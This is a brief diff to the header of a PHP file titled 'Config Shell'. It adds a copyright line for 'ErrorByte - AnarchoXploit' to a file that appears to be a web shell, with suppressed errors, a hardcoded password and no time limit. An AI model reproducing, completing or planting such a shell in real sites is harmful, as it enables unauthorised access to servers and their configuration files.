@@ -1,5 +1,6 @@
 <?php
 # Config Shell
+# Copyright (c)2018 - ErrorByte - AnarchoXploit
 error_reporting(0);
 $password = 'ErrorByte';
 set_time_limit(0);
